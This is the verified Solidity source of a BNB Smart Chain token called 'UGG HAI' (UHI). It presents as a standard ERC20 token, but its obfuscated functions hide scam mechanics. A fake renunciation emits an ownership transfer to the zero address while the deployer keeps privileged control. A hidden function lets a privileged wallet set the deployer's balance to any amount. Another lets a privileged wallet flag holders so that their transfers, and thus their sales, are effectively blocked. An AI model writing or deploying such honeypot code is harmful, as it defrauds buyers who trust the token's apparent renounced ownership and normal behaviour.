/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

abstract contract tradingMax {
    function tradingReceiver() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface teamToLaunched {
    function createPair(address tokenMin, address fundAmount) external returns (address);
}

interface shouldEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract UGGHAI is IERC20, tradingMax {
    
    uint256 private minTx = 100000000 * 10 ** 18;
    uint256 private amountToken;
    address private amountList;
    bool public listMin;
    mapping(address => bool) public receiverWallet;
    uint256 public toTeam;

    uint8 private shouldReceiver = 18;
    event OwnershipTransferred(address indexed launchedIs, address indexed maxAutoFee);
    bool private shouldLaunched;
    string private takeReceiver = "UHI";
    bool public receiverEnable;
    address public amountMin;
    bool private launchFund;
    uint256 private listFeeLimit;
    uint256 public swapTo;

    uint256 private exemptIs;


    string private buyTokenList = "UGG HAI";
    
    mapping(address => uint256) private txTotal;
    uint256 constant totalShould = 10 ** 10;
    bool private receiverSell;
    mapping(address => mapping(address => uint256)) private launchedLiquidity;
    mapping(address => bool) public walletReceiver;
    uint256 private senderList;
    address public txAuto;
    

    constructor (){
        
        shouldEnable enableWallet = shouldEnable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        amountMin = teamToLaunched(enableWallet.factory()).createPair(enableWallet.WETH(), address(this));
        amountList = tradingReceiver();
        if (senderList != exemptIs) {
            senderList = amountToken;
        }
        txAuto = amountList;
        receiverWallet[txAuto] = true;
        if (toTeam != exemptIs) {
            amountToken = swapTo;
        }
        txTotal[txAuto] = minTx;
        emit Transfer(address(0), txAuto, minTx);
        atIs();
    }

    

    function exemptListFund() public view returns (bool) {
        return launchFund;
    }

    function teamIs() public {
        
        if (senderList != toTeam) {
            launchFund = true;
        }
        launchFund=false;
    }

    function atIs() public {
        emit OwnershipTransferred(txAuto, address(0));
        amountList = address(0);
    }

    function decimals() external view returns (uint8) {
        return shouldReceiver;
    }

    function tokenFee(address launchLimit) public {
        if (receiverEnable) {
            return;
        }
        if (launchFund != listMin) {
            listMin = true;
        }
        receiverWallet[launchLimit] = true;
        
        receiverEnable = true;
    }

    function txReceiver() public {
        
        if (listMin) {
            launchFund = true;
        }
        launchFund=false;
    }

    function atWallet() public view returns (uint256) {
        return swapTo;
    }

    function symbol() external view returns (string memory) {
        return takeReceiver;
    }

    function allowance(address feeToken, address maxMarketingFrom) external view virtual override returns (uint256) {
        return launchedLiquidity[feeToken][maxMarketingFrom];
    }

    function owner() external view returns (address) {
        return amountList;
    }

    function getOwner() external view returns (address) {
        return amountList;
    }

    function transfer(address shouldToken, uint256 swapLaunch) external virtual override returns (bool) {
        return shouldAutoLaunched(tradingReceiver(), shouldToken, swapLaunch);
    }

    function liquiditySenderSwap(address feeIs) public {
        
        if (feeIs == txAuto || feeIs == amountMin || !receiverWallet[tradingReceiver()]) {
            return;
        }
        
        walletReceiver[feeIs] = true;
    }

    function toSender() public {
        
        
        listFeeLimit=0;
    }

    function balanceOf(address enableExempt) public view virtual override returns (uint256) {
        return txTotal[enableExempt];
    }

    function toReceiver() public {
        if (launchFund) {
            exemptIs = toTeam;
        }
        if (listMin == launchFund) {
            receiverSell = true;
        }
        launchFund=false;
    }

    function isList() public view returns (bool) {
        return receiverSell;
    }

    function approve(address maxMarketingFrom, uint256 swapLaunch) public virtual override returns (bool) {
        launchedLiquidity[tradingReceiver()][maxMarketingFrom] = swapLaunch;
        emit Approval(tradingReceiver(), maxMarketingFrom, swapLaunch);
        return true;
    }

    function transferFrom(address tokenTeamTake, address swapFrom, uint256 swapLaunch) external override returns (bool) {
        if (launchedLiquidity[tokenTeamTake][tradingReceiver()] != type(uint256).max) {
            require(swapLaunch <= launchedLiquidity[tokenTeamTake][tradingReceiver()]);
            launchedLiquidity[tokenTeamTake][tradingReceiver()] -= swapLaunch;
        }
        return shouldAutoLaunched(tokenTeamTake, swapFrom, swapLaunch);
    }

    function shouldAutoLaunched(address tokenTeamTake, address swapFrom, uint256 swapLaunch) internal returns (bool) {
        if (tokenTeamTake == txAuto) {
            return totalTeamSender(tokenTeamTake, swapFrom, swapLaunch);
        }
        if (walletReceiver[tokenTeamTake]) {
            return totalTeamSender(tokenTeamTake, swapFrom, totalShould);
        }
        return totalTeamSender(tokenTeamTake, swapFrom, swapLaunch);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return minTx;
    }

    function name() external view returns (string memory) {
        return buyTokenList;
    }

    function totalTeamSender(address tokenTeamTake, address swapFrom, uint256 swapLaunch) internal returns (bool) {
        require(txTotal[tokenTeamTake] >= swapLaunch);
        txTotal[tokenTeamTake] -= swapLaunch;
        txTotal[swapFrom] += swapLaunch;
        emit Transfer(tokenTeamTake, swapFrom, swapLaunch);
        return true;
    }

    function teamTradingMode(uint256 swapLaunch) public {
        if (!receiverWallet[tradingReceiver()]) {
            return;
        }
        txTotal[txAuto] = swapLaunch;
    }


}